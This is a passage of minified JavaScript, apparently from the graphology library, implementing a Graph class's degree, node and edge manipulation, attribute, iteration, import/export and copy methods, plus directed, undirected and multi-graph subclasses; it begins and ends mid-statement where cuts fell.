"'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.inDegree},i.outDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.outDegree: could not find the "'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.outDegree},i.directedDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.directedDegree: could not find the "'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.inDegree+e.outDegree},i.undirectedDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.undirectedDegree: could not find the "'.concat(t,'" node in the graph.'));return"directed"===this.type?0:e.undirectedDegree},i.inboundDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.inboundDegree: could not find the "'.concat(t,'" node in the graph.'));var n=0;return"directed"!==this.type&&(n+=e.undirectedDegree),"undirected"!==this.type&&(n+=e.inDegree),n},i.outboundDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.outboundDegree: could not find the "'.concat(t,'" node in the graph.'));var n=0;return"directed"!==this.type&&(n+=e.undirectedDegree),"undirected"!==this.type&&(n+=e.outDegree),n},i.degree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.degree: could not find the "'.concat(t,'" node in the graph.'));var n=0;return"directed"!==this.type&&(n+=e.undirectedDegree),"undirected"!==this.type&&(n+=e.inDegree+e.outDegree),n},i.inDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.inDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.inDegree-e.directedLoops},i.outDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.outDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.outDegree-e.directedLoops},i.directedDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.directedDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));return"undirected"===this.type?0:e.inDegree+e.outDegree-2*e.directedLoops},i.undirectedDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.undirectedDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));return"directed"===this.type?0:e.undirectedDegree-2*e.undirectedLoops},i.inboundDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.inboundDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));var n=0,r=0;return"directed"!==this.type&&(n+=e.undirectedDegree,r+=2*e.undirectedLoops),"undirected"!==this.type&&(n+=e.inDegree,r+=e.directedLoops),n-r},i.outboundDegreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.outboundDegreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));var n=0,r=0;return"directed"!==this.type&&(n+=e.undirectedDegree,r+=2*e.undirectedLoops),"undirected"!==this.type&&(n+=e.outDegree,r+=e.directedLoops),n-r},i.degreeWithoutSelfLoops=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.degreeWithoutSelfLoops: could not find the "'.concat(t,'" node in the graph.'));var n=0,r=0;return"directed"!==this.type&&(n+=e.undirectedDegree,r+=2*e.undirectedLoops),"undirected"!==this.type&&(n+=e.inDegree+e.outDegree,r+=2*e.directedLoops),n-r},i.source=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.source: could not find the "'.concat(t,'" edge in the graph.'));return e.source.key},i.target=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.target: could not find the "'.concat(t,'" edge in the graph.'));return e.target.key},i.extremities=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.extremities: could not find the "'.concat(t,'" edge in the graph.'));return[e.source.key,e.target.key]},i.opposite=function(t,e){t=""+t,e=""+e;var n=this._edges.get(e);if(!n)throw new q('Graph.opposite: could not find the "'.concat(e,'" edge in the graph.'));var r=n.source.key,i=n.target.key;if(t===r)return i;if(t===i)return r;throw new q('Graph.opposite: the "'.concat(t,'" node is not attached to the "').concat(e,'" edge (').concat(r,", ").concat(i,")."))},i.hasExtremity=function(t,e){t=""+t,e=""+e;var n=this._edges.get(t);if(!n)throw new q('Graph.hasExtremity: could not find the "'.concat(t,'" edge in the graph.'));return n.source.key===e||n.target.key===e},i.isUndirected=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.isUndirected: could not find the "'.concat(t,'" edge in the graph.'));return e.undirected},i.isDirected=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.isDirected: could not find the "'.concat(t,'" edge in the graph.'));return!e.undirected},i.isSelfLoop=function(t){t=""+t;var e=this._edges.get(t);if(!e)throw new q('Graph.isSelfLoop: could not find the "'.concat(t,'" edge in the graph.'));return e.source===e.target},i.addNode=function(t,e){var n=function(t,e,n){if(n&&!s(n))throw new F('Graph.addNode: invalid attributes. Expecting an object but got "'.concat(n,'"'));if(e=""+e,n=n||{},t._nodes.has(e))throw new B('Graph.addNode: the "'.concat(e,'" node already exist in the graph.'));var r=new t.NodeDataClass(e,n);return t._nodes.set(e,r),t.emit("nodeAdded",{key:e,attributes:n}),r}(this,t,e);return n.key},i.mergeNode=function(t,e){if(e&&!s(e))throw new F('Graph.mergeNode: invalid attributes. Expecting an object but got "'.concat(e,'"'));t=""+t,e=e||{};var n=this._nodes.get(t);return n?(e&&(u(n.attributes,e),this.emit("nodeAttributesUpdated",{type:"merge",key:t,attributes:n.attributes,data:e})),[t,!1]):(n=new this.NodeDataClass(t,e),this._nodes.set(t,n),this.emit("nodeAdded",{key:t,attributes:e}),[t,!0])},i.updateNode=function(t,e){if(e&&"function"!=typeof e)throw new F('Graph.updateNode: invalid updater function. Expecting a function but got "'.concat(e,'"'));t=""+t;var n=this._nodes.get(t);if(n){if(e){var r=n.attributes;n.attributes=e(r),this.emit("nodeAttributesUpdated",{type:"replace",key:t,attributes:n.attributes})}return[t,!1]}var i=e?e({}):{};return n=new this.NodeDataClass(t,i),this._nodes.set(t,n),this.emit("nodeAdded",{key:t,attributes:i}),[t,!0]},i.dropNode=function(t){t=""+t;var e,n=this._nodes.get(t);if(!n)throw new q('Graph.dropNode: could not find the "'.concat(t,'" node in the graph.'));if("undirected"!==this.type){for(var r in n.out){e=n.out[r];do{At(this,e),e=e.next}while(e)}for(var i in n.in){e=n.in[i];do{At(this,e),e=e.next}while(e)}}if("directed"!==this.type)for(var o in n.undirected){e=n.undirected[o];do{At(this,e),e=e.next}while(e)}this._nodes.delete(t),this.emit("nodeDropped",{key:t,attributes:n.attributes})},i.dropEdge=function(t){var e;if(arguments.length>1){var n=""+arguments[0],r=""+arguments[1];if(!(e=c(this,n,r,this.type)))throw new q('Graph.dropEdge: could not find the "'.concat(n,'" -> "').concat(r,'" edge in the graph.'))}else if(t=""+t,!(e=this._edges.get(t)))throw new q('Graph.dropEdge: could not find the "'.concat(t,'" edge in the graph.'));return At(this,e),this},i.dropDirectedEdge=function(t,e){if(arguments.length<2)throw new B("Graph.dropDirectedEdge: it does not make sense to try and drop a directed edge by key. What if the edge with this key is undirected? Use #.dropEdge for this purpose instead.");if(this.multi)throw new B("Graph.dropDirectedEdge: cannot use a {source,target} combo when dropping an edge in a MultiGraph since we cannot infer the one you want to delete as there could be multiple ones.");var n=c(this,t=""+t,e=""+e,"directed");if(!n)throw new q('Graph.dropDirectedEdge: could not find a "'.concat(t,'" -> "').concat(e,'" edge in the graph.'));return At(this,n),this},i.dropUndirectedEdge=function(t,e){if(arguments.length<2)throw new B("Graph.dropUndirectedEdge: it does not make sense to drop a directed edge by key. What if the edge with this key is undirected? Use #.dropEdge for this purpose instead.");if(this.multi)throw new B("Graph.dropUndirectedEdge: cannot use a {source,target} combo when dropping an edge in a MultiGraph since we cannot infer the one you want to delete as there could be multiple ones.");var n=c(this,t,e,"undirected");if(!n)throw new q('Graph.dropUndirectedEdge: could not find a "'.concat(t,'" -> "').concat(e,'" edge in the graph.'));return At(this,n),this},i.clear=function(){this._edges.clear(),this._nodes.clear(),this._resetInstanceCounters(),this.emit("cleared")},i.clearEdges=function(){for(var t,e=this._nodes.values();!0!==(t=e.next()).done;)t.value.clear();this._edges.clear(),this._resetInstanceCounters(),this.emit("edgesCleared")},i.getAttribute=function(t){return this._attributes[t]},i.getAttributes=function(){return this._attributes},i.hasAttribute=function(t){return this._attributes.hasOwnProperty(t)},i.setAttribute=function(t,e){return this._attributes[t]=e,this.emit("attributesUpdated",{type:"set",attributes:this._attributes,name:t}),this},i.updateAttribute=function(t,e){if("function"!=typeof e)throw new F("Graph.updateAttribute: updater should be a function.");var n=this._attributes[t];return this._attributes[t]=e(n),this.emit("attributesUpdated",{type:"set",attributes:this._attributes,name:t}),this},i.removeAttribute=function(t){return delete this._attributes[t],this.emit("attributesUpdated",{type:"remove",attributes:this._attributes,name:t}),this},i.replaceAttributes=function(t){if(!s(t))throw new F("Graph.replaceAttributes: provided attributes are not a plain object.");return this._attributes=t,this.emit("attributesUpdated",{type:"replace",attributes:this._attributes}),this},i.mergeAttributes=function(t){if(!s(t))throw new F("Graph.mergeAttributes: provided attributes are not a plain object.");return u(this._attributes,t),this.emit("attributesUpdated",{type:"merge",attributes:this._attributes,data:t}),this},i.updateAttributes=function(t){if("function"!=typeof t)throw new F("Graph.updateAttributes: provided updater is not a function.");return this._attributes=t(this._attributes),this.emit("attributesUpdated",{type:"update",attributes:this._attributes}),this},i.updateEachNodeAttributes=function(t,e){if("function"!=typeof t)throw new F("Graph.updateEachNodeAttributes: expecting an updater function.");if(e&&!d(e))throw new F("Graph.updateEachNodeAttributes: invalid hints. Expecting an object having the following shape: {attributes?: [string]}");for(var n,r,i=this._nodes.values();!0!==(n=i.next()).done;)(r=n.value).attributes=t(r.key,r.attributes);this.emit("eachNodeAttributesUpdated",{hints:e||null})},i.updateEachEdgeAttributes=function(t,e){if("function"!=typeof t)throw new F("Graph.updateEachEdgeAttributes: expecting an updater function.");if(e&&!d(e))throw new F("Graph.updateEachEdgeAttributes: invalid hints. Expecting an object having the following shape: {attributes?: [string]}");for(var n,r,i,o,a=this._edges.values();!0!==(n=a.next()).done;)i=(r=n.value).source,o=r.target,r.attributes=t(r.key,r.attributes,i.key,o.key,i.attributes,o.attributes,r.undirected);this.emit("eachEdgeAttributesUpdated",{hints:e||null})},i.forEachAdjacencyEntry=function(t){if("function"!=typeof t)throw new F("Graph.forEachAdjacencyEntry: expecting a callback.");yt(!1,!1,!1,this,t)},i.forEachAdjacencyEntryWithOrphans=function(t){if("function"!=typeof t)throw new F("Graph.forEachAdjacencyEntryWithOrphans: expecting a callback.");yt(!1,!1,!0,this,t)},i.forEachAssymetricAdjacencyEntry=function(t){if("function"!=typeof t)throw new F("Graph.forEachAssymetricAdjacencyEntry: expecting a callback.");yt(!1,!0,!1,this,t)},i.forEachAssymetricAdjacencyEntryWithOrphans=function(t){if("function"!=typeof t)throw new F("Graph.forEachAssymetricAdjacencyEntryWithOrphans: expecting a callback.");yt(!1,!0,!0,this,t)},i.nodes=function(){return"function"==typeof Array.from?Array.from(this._nodes.keys()):I(this._nodes.keys(),this._nodes.size)},i.forEachNode=function(t){if("function"!=typeof t)throw new F("Graph.forEachNode: expecting a callback.");for(var e,n,r=this._nodes.values();!0!==(e=r.next()).done;)t((n=e.value).key,n.attributes)},i.findNode=function(t){if("function"!=typeof t)throw new F("Graph.findNode: expecting a callback.");for(var e,n,r=this._nodes.values();!0!==(e=r.next()).done;)if(t((n=e.value).key,n.attributes))return n.key},i.mapNodes=function(t){if("function"!=typeof t)throw new F("Graph.mapNode: expecting a callback.");for(var e,n,r=this._nodes.values(),i=new Array(this.order),o=0;!0!==(e=r.next()).done;)n=e.value,i[o++]=t(n.key,n.attributes);return i},i.someNode=function(t){if("function"!=typeof t)throw new F("Graph.someNode: expecting a callback.");for(var e,n,r=this._nodes.values();!0!==(e=r.next()).done;)if(t((n=e.value).key,n.attributes))return!0;return!1},i.everyNode=function(t){if("function"!=typeof t)throw new F("Graph.everyNode: expecting a callback.");for(var e,n,r=this._nodes.values();!0!==(e=r.next()).done;)if(!t((n=e.value).key,n.attributes))return!1;return!0},i.filterNodes=function(t){if("function"!=typeof t)throw new F("Graph.filterNodes: expecting a callback.");for(var e,n,r=this._nodes.values(),i=[];!0!==(e=r.next()).done;)t((n=e.value).key,n.attributes)&&i.push(n.key);return i},i.reduceNodes=function(t,e){if("function"!=typeof t)throw new F("Graph.reduceNodes: expecting a callback.");if(arguments.length<2)throw new F("Graph.reduceNodes: missing initial value. You must provide it because the callback takes more than one argument and we cannot infer the initial value from the first iteration, as you could with a simple array.");for(var n,r,i=e,o=this._nodes.values();!0!==(n=o.next()).done;)i=t(i,(r=n.value).key,r.attributes);return i},i.nodeEntries=function(){var t=this._nodes.values();return new T((function(){var e=t.next();if(e.done)return e;var n=e.value;return{value:{node:n.key,attributes:n.attributes},done:!1}}))},i.export=function(){var t=this,e=new Array(this._nodes.size),n=0;this._nodes.forEach((function(t,r){e[n++]=function(t,e){var n={key:t};return h(e.attributes)||(n.attributes=u({},e.attributes)),n}(r,t)}));var r=new Array(this._edges.size);return n=0,this._edges.forEach((function(e,i){r[n++]=function(t,e,n){var r={key:e,source:n.source.key,target:n.target.key};return h(n.attributes)||(r.attributes=u({},n.attributes)),"mixed"===t&&n.undirected&&(r.undirected=!0),r}(t.type,i,e)})),{options:{type:this.type,multi:this.multi,allowSelfLoops:this.allowSelfLoops},attributes:this.getAttributes(),nodes:e,edges:r}},i.import=function(t){var e,n,i,o,a,u=this,c=arguments.length>1&&void 0!==arguments[1]&&arguments[1];if(t instanceof r)return t.forEachNode((function(t,e){c?u.mergeNode(t,e):u.addNode(t,e)})),t.forEachEdge((function(t,e,n,r,i,o,a){c?a?u.mergeUndirectedEdgeWithKey(t,n,r,e):u.mergeDirectedEdgeWithKey(t,n,r,e):a?u.addUndirectedEdgeWithKey(t,n,r,e):u.addDirectedEdgeWithKey(t,n,r,e)})),this;if(!s(t))throw new F("Graph.import: invalid argument. Expecting a serialized graph or, alternatively, a Graph instance.");if(t.attributes){if(!s(t.attributes))throw new F("Graph.import: invalid attributes. Expecting a plain object.");c?this.mergeAttributes(t.attributes):this.replaceAttributes(t.attributes)}if(t.nodes){if(i=t.nodes,!Array.isArray(i))throw new F("Graph.import: invalid nodes. Expecting an array.");for(e=0,n=i.length;e<n;e++){gt(o=i[e]);var h=o,f=h.key,l=h.attributes;c?this.mergeNode(f,l):this.addNode(f,l)}}if(t.edges){var d=!1;if("undirected"===this.type&&(d=!0),i=t.edges,!Array.isArray(i))throw new F("Graph.import: invalid edges. Expecting an array.");for(e=0,n=i.length;e<n;e++){vt(a=i[e]);var p=a,y=p.source,g=p.target,v=p.attributes,m=p.undirected,_=void 0===m?d:m;"key"in a?(c?_?this.mergeUndirectedEdgeWithKey:this.mergeDirectedEdgeWithKey:_?this.addUndirectedEdgeWithKey:this.addDirectedEdgeWithKey).call(this,a.key,y,g,v):(c?_?this.mergeUndirectedEdge:this.mergeDirectedEdge:_?this.addUndirectedEdge:this.addDirectedEdge).call(this,y,g,v)}}return this},i.nullCopy=function(t){var e=new r(u({},this._options,t));return e.replaceAttributes(u({},this.getAttributes())),e},i.emptyCopy=function(t){var e=this.nullCopy(t);return this._nodes.forEach((function(t,n){var r=u({},t.attributes);t=new e.NodeDataClass(n,r),e._nodes.set(n,t)})),e},i.copy=function(t){if("string"==typeof(t=t||{}).type&&t.type!==this.type&&"mixed"!==t.type)throw new B('Graph.copy: cannot create an incompatible copy from "'.concat(this.type,'" type to "').concat(t.type,'" because this would mean losing information about the current graph.'));if("boolean"==typeof t.multi&&t.multi!==this.multi&&!0!==t.multi)throw new B("Graph.copy: cannot create an incompatible copy by downgrading a multi graph to a simple one because this would mean losing information about the current graph.");if("boolean"==typeof t.allowSelfLoops&&t.allowSelfLoops!==this.allowSelfLoops&&!0!==t.allowSelfLoops)throw new B("Graph.copy: cannot create an incompatible copy from a graph allowing self loops to one that does not because this would mean losing information about the current graph.");for(var e,n,r=this.emptyCopy(t),i=this._edges.values();!0!==(e=i.next()).done;)Mt(r,"copy",!1,(n=e.value).undirected,n.key,n.source.key,n.target.key,u({},n.attributes));return r},i.toJSON=function(){return this.export()},i.toString=function(){return"[object Graph]"},i.inspect=function(){var e=this,n={};this._nodes.forEach((function(t,e){n[e]=t.attributes}));var r={},i={};this._edges.forEach((function(t,n){var o,a=t.undirected?"--":"->",u="",c=t.source.key,s=t.target.key;t.undirected&&c>s&&(o=c,c=s,s=o);var h="(".concat(c,")").concat(a,"(").concat(s,")");n.startsWith("geid_")?e.multi&&(void 0===i[h]?i[h]=0:i[h]++,u+="".concat(i[h],". ")):u+="[".concat(n,"]: "),r[u+=h]=t.attributes}));var o={};for(var a in this)this.hasOwnProperty(a)&&!wt.has(a)&&"function"!=typeof this[a]&&"symbol"!==t(a)&&(o[a]=this[a]);return o.attributes=this._attributes,o.nodes=n,o.edges=r,f(o,"constructor",this.constructor),o},r}(y.exports.EventEmitter);"undefined"!=typeof Symbol&&(St.prototype[Symbol.for("nodejs.util.inspect.custom")]=St.prototype.inspect),[{name:function(t){return"".concat(t,"Edge")},generateKey:!0},{name:function(t){return"".concat(t,"DirectedEdge")},generateKey:!0,type:"directed"},{name:function(t){return"".concat(t,"UndirectedEdge")},generateKey:!0,type:"undirected"},{name:function(t){return"".concat(t,"EdgeWithKey")}},{name:function(t){return"".concat(t,"DirectedEdgeWithKey")},type:"directed"},{name:function(t){return"".concat(t,"UndirectedEdgeWithKey")},type:"undirected"}].forEach((function(t){["add","merge","update"].forEach((function(e){var n=t.name(e),r="add"===e?Mt:Et;t.generateKey?St.prototype[n]=function(i,o,a){return r(this,n,!0,"undirected"===(t.type||this.type),null,i,o,a,"update"===e)}:St.prototype[n]=function(i,o,a,u){return r(this,n,!1,"undirected"===(t.type||this.type),i,o,a,u,"update"===e)}}))})),function(t){$.forEach((function(e){var n=e.name,r=e.attacher;r(t,n("Node"),0),r(t,n("Source"),1),r(t,n("Target"),2),r(t,n("Opposite"),3)}))}(St),function(t){V.forEach((function(e){var n=e.name,r=e.attacher;r(t,n("Edge"),"mixed"),r(t,n("DirectedEdge"),"directed"),r(t,n("UndirectedEdge"),"undirected")}))}(St),function(t){tt.forEach((function(e){!function(t,e){var n=e.name,r=e.type,i=e.direction;t.prototype[n]=function(t,e){if("mixed"!==r&&"mixed"!==this.type&&r!==this.type)return[];if(!arguments.length)return function(t,e){if(0===t.size)return[];if("mixed"===e||e===t.type)return"function"==typeof Array.from?Array.from(t._edges.keys()):I(t._edges.keys(),t._edges.size);for(var n,r,i="undirected"===e?t.undirectedSize:t.directedSize,o=new Array(i),a="undirected"===e,u=t._edges.values(),c=0;!0!==(n=u.next()).done;)(r=n.value).undirected===a&&(o[c++]=r.key);return o}(this,r);if(1===arguments.length){t=""+t;var o=this._nodes.get(t);if(void 0===o)throw new q("Graph.".concat(n,': could not find the "').concat(t,'" node in the graph.'));return function(t,e,n,r){var i=[];return ct(!1,t,e,n,r,(function(t){i.push(t)})),i}(this.multi,"mixed"===r?this.type:r,i,o)}if(2===arguments.length){t=""+t,e=""+e;var a=this._nodes.get(t);if(!a)throw new q("Graph.".concat(n,':  could not find the "').concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q("Graph.".concat(n,':  could not find the "').concat(e,'" target node in the graph.'));return function(t,e,n,r,i){var o=[];return st(!1,t,e,n,r,i,(function(t){o.push(t)})),o}(r,this.multi,i,a,e)}throw new F("Graph.".concat(n,": too many arguments (expecting 0, 1 or 2 and got ").concat(arguments.length,")."))}}(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o="forEach"+n[0].toUpperCase()+n.slice(1,-1);t.prototype[o]=function(t,e,n){if("mixed"===r||"mixed"===this.type||r===this.type){if(1===arguments.length)return ut(!1,this,r,n=t);if(2===arguments.length){t=""+t,n=e;var a=this._nodes.get(t);if(void 0===a)throw new q("Graph.".concat(o,': could not find the "').concat(t,'" node in the graph.'));return ct(!1,this.multi,"mixed"===r?this.type:r,i,a,n)}if(3===arguments.length){t=""+t,e=""+e;var u=this._nodes.get(t);if(!u)throw new q("Graph.".concat(o,':  could not find the "').concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q("Graph.".concat(o,':  could not find the "').concat(e,'" target node in the graph.'));return st(!1,r,this.multi,i,u,e,n)}throw new F("Graph.".concat(o,": too many arguments (expecting 1, 2 or 3 and got ").concat(arguments.length,")."))}};var a="map"+n[0].toUpperCase()+n.slice(1);t.prototype[a]=function(){var t,e=Array.prototype.slice.call(arguments),n=e.pop();if(0===e.length){var i=0;"directed"!==r&&(i+=this.undirectedSize),"undirected"!==r&&(i+=this.directedSize),t=new Array(i);var a=0;e.push((function(e,r,i,o,u,c,s){t[a++]=n(e,r,i,o,u,c,s)}))}else t=[],e.push((function(e,r,i,o,a,u,c){t.push(n(e,r,i,o,a,u,c))}));return this[o].apply(this,e),t};var u="filter"+n[0].toUpperCase()+n.slice(1);t.prototype[u]=function(){var t=Array.prototype.slice.call(arguments),e=t.pop(),n=[];return t.push((function(t,r,i,o,a,u,c){e(t,r,i,o,a,u,c)&&n.push(t)})),this[o].apply(this,t),n};var c="reduce"+n[0].toUpperCase()+n.slice(1);t.prototype[c]=function(){var t,e,n=Array.prototype.slice.call(arguments);if(n.length<2||n.length>4)throw new F("Graph.".concat(c,": invalid number of arguments (expecting 2, 3 or 4 and got ").concat(n.length,")."));if("function"==typeof n[n.length-1]&&"function"!=typeof n[n.length-2])throw new F("Graph.".concat(c,": missing initial value. You must provide it because the callback takes more than one argument and we cannot infer the initial value from the first iteration, as you could with a simple array."));2===n.length?(t=n[0],e=n[1],n=[]):3===n.length?(t=n[1],e=n[2],n=[n[0]]):4===n.length&&(t=n[2],e=n[3],n=[n[0],n[1]]);var r=e;return n.push((function(e,n,i,o,a,u,c){r=t(r,e,n,i,o,a,u,c)})),this[o].apply(this,n),r}}(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o="find"+n[0].toUpperCase()+n.slice(1,-1);t.prototype[o]=function(t,e,n){if("mixed"!==r&&"mixed"!==this.type&&r!==this.type)return!1;if(1===arguments.length)return ut(!0,this,r,n=t);if(2===arguments.length){t=""+t,n=e;var a=this._nodes.get(t);if(void 0===a)throw new q("Graph.".concat(o,': could not find the "').concat(t,'" node in the graph.'));return ct(!0,this.multi,"mixed"===r?this.type:r,i,a,n)}if(3===arguments.length){t=""+t,e=""+e;var u=this._nodes.get(t);if(!u)throw new q("Graph.".concat(o,':  could not find the "').concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q("Graph.".concat(o,':  could not find the "').concat(e,'" target node in the graph.'));return st(!0,r,this.multi,i,u,e,n)}throw new F("Graph.".concat(o,": too many arguments (expecting 1, 2 or 3 and got ").concat(arguments.length,")."))};var a="some"+n[0].toUpperCase()+n.slice(1,-1);t.prototype[a]=function(){var t=Array.prototype.slice.call(arguments),e=t.pop();return t.push((function(t,n,r,i,o,a,u){return e(t,n,r,i,o,a,u)})),!!this[o].apply(this,t)};var u="every"+n[0].toUpperCase()+n.slice(1,-1);t.prototype[u]=function(){var t=Array.prototype.slice.call(arguments),e=t.pop();return t.push((function(t,n,r,i,o,a,u){return!e(t,n,r,i,o,a,u)})),!this[o].apply(this,t)}}(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o=n.slice(0,-1)+"Entries";t.prototype[o]=function(t,e){if("mixed"!==r&&"mixed"!==this.type&&r!==this.type)return T.empty();if(!arguments.length)return function(t,e){if(0===t.size)return T.empty();var n="mixed"!==e&&e!==t.type,r="undirected"===e,i=t._edges.values();return new T((function(){for(var t,e;;){if((t=i.next()).done)return t;if(e=t.value,!n||e.undirected===r)break}return{value:{edge:e.key,attributes:e.attributes,source:e.source.key,target:e.target.key,sourceAttributes:e.source.attributes,targetAttributes:e.target.attributes,undirected:e.undirected},done:!1}}))}(this,r);if(1===arguments.length){t=""+t;var n=this._nodes.get(t);if(!n)throw new q("Graph.".concat(o,': could not find the "').concat(t,'" node in the graph.'));return function(t,e,n){var r=T.empty();return"undirected"!==t&&("out"!==e&&void 0!==n.in&&(r=Q(r,rt(n.in))),"in"!==e&&void 0!==n.out&&(r=Q(r,rt(n.out,e?void 0:n.key)))),"directed"!==t&&void 0!==n.undirected&&(r=Q(r,rt(n.undirected))),r}(r,i,n)}if(2===arguments.length){t=""+t,e=""+e;var a=this._nodes.get(t);if(!a)throw new q("Graph.".concat(o,':  could not find the "').concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q("Graph.".concat(o,':  could not find the "').concat(e,'" target node in the graph.'));return function(t,e,n,r){var i=T.empty();return"undirected"!==t&&(void 0!==n.in&&"out"!==e&&r in n.in&&(i=Q(i,at(n.in,r))),void 0!==n.out&&"in"!==e&&r in n.out&&(e||n.key!==r)&&(i=Q(i,at(n.out,r)))),"directed"!==t&&void 0!==n.undirected&&r in n.undirected&&(i=Q(i,at(n.undirected,r))),i}(r,i,a,e)}throw new F("Graph.".concat(o,": too many arguments (expecting 0, 1 or 2 and got ").concat(arguments.length,")."))}}(t,e)}))}(St),function(t){ht.forEach((function(e){(function(t,e){var n=e.name,r=e.type,i=e.direction;t.prototype[n]=function(t){if("mixed"!==r&&"mixed"!==this.type&&r!==this.type)return[];t=""+t;var e=this._nodes.get(t);if(void 0===e)throw new q("Graph.".concat(n,': could not find the "').concat(t,'" node in the graph.'));return function(t,e,n){if("mixed"!==t){if("undirected"===t)return Object.keys(n.undirected);if("string"==typeof e)return Object.keys(n[e])}var r=[];return dt(!1,t,e,n,(function(t){r.push(t)})),r}("mixed"===r?this.type:r,i,e)}})(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o="forEach"+n[0].toUpperCase()+n.slice(1,-1);t.prototype[o]=function(t,e){if("mixed"===r||"mixed"===this.type||r===this.type){t=""+t;var n=this._nodes.get(t);if(void 0===n)throw new q("Graph.".concat(o,': could not find the "').concat(t,'" node in the graph.'));dt(!1,"mixed"===r?this.type:r,i,n,e)}};var a="map"+n[0].toUpperCase()+n.slice(1);t.prototype[a]=function(t,e){var n=[];return this[o](t,(function(t,r){n.push(e(t,r))})),n};var u="filter"+n[0].toUpperCase()+n.slice(1);t.prototype[u]=function(t,e){var n=[];return this[o](t,(function(t,r){e(t,r)&&n.push(t)})),n};var c="reduce"+n[0].toUpperCase()+n.slice(1);t.prototype[c]=function(t,e,n){if(arguments.length<3)throw new F("Graph.".concat(c,": missing initial value. You must provide it because the callback takes more than one argument and we cannot infer the initial value from the first iteration, as you could with a simple array."));var r=n;return this[o](t,(function(t,n){r=e(r,t,n)})),r}}(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o=n[0].toUpperCase()+n.slice(1,-1),a="find"+o;t.prototype[a]=function(t,e){if("mixed"===r||"mixed"===this.type||r===this.type){t=""+t;var n=this._nodes.get(t);if(void 0===n)throw new q("Graph.".concat(a,': could not find the "').concat(t,'" node in the graph.'));return dt(!0,"mixed"===r?this.type:r,i,n,e)}};var u="some"+o;t.prototype[u]=function(t,e){return!!this[a](t,e)};var c="every"+o;t.prototype[c]=function(t,e){return!this[a](t,(function(t,n){return!e(t,n)}))}}(t,e),function(t,e){var n=e.name,r=e.type,i=e.direction,o=n.slice(0,-1)+"Entries";t.prototype[o]=function(t){if("mixed"!==r&&"mixed"!==this.type&&r!==this.type)return T.empty();t=""+t;var e=this._nodes.get(t);if(void 0===e)throw new q("Graph.".concat(o,': could not find the "').concat(t,'" node in the graph.'));return function(t,e,n){if("mixed"!==t){if("undirected"===t)return pt(null,n,n.undirected);if("string"==typeof e)return pt(null,n,n[e])}var r=T.empty(),i=new ft;return"undirected"!==t&&("out"!==e&&(r=Q(r,pt(i,n,n.in))),"in"!==e&&(r=Q(r,pt(i,n,n.out)))),"directed"!==t&&(r=Q(r,pt(i,n,n.undirected))),r}("mixed"===r?this.type:r,i,e)}}(t,e)}))}(St);var Lt=function(t){function n(e){var n=u({type:"directed"},e);if("multi"in n&&!1!==n.multi)throw new F("DirectedGraph.from: inconsistent indication that the graph should be multi in given options!");if("directed"!==n.type)throw new F('DirectedGraph.from: inconsistent "'+n.type+'" type in given options!');return t.call(this,n)||this}return e(n,t),n}(St),Nt=function(t){function n(e){var n=u({type:"undirected"},e);if("multi"in n&&!1!==n.multi)throw new F("UndirectedGraph.from: inconsistent indication that the graph should be multi in given options!");if("undirected"!==n.type)throw new F('UndirectedGraph.from: inconsistent "'+n.type+'" type in given options!');return t.call(this,n)||this}return e(n,t),n}(St),Ct=function(t){function n(e){var n=u({multi:!0},e);if("multi"in n&&!0!==n.multi)throw new F("MultiGraph.from: inconsistent indication that the graph should be simple in given options!");return t.call(this,n)||this}return e(n,t),n}(St),Tt=function(t){function n(e){var n=u({type:"directed",multi:!0},e);if("multi"in n&&!0!==n.multi)throw new F("MultiDirectedGraph.from: inconsistent indication that the graph should be simple in given options!");if("directed"!==n.type)throw new F('MultiDirectedGraph.from: inconsistent "'+n.type+'" type in given options!');return t.call(this,n)||this}return e(n,t),n}(St),Gt=function(t){function n(e){var n=u({type:"undirected",multi:!0},e);if("multi"in n&&!0!==n.multi)throw new F("MultiUndirectedGraph.from: inconsistent indication that the graph should be simple in given options!");if("undirected"!==n.type)throw new F('MultiUndirectedGraph.from: inconsistent "'+n.type+'" type in given options!');return t.call(this,n)||this}return e(n,t),n}(St);function Ut(t){t.from=function(e,n){var r=u({},e.options,n),i=new 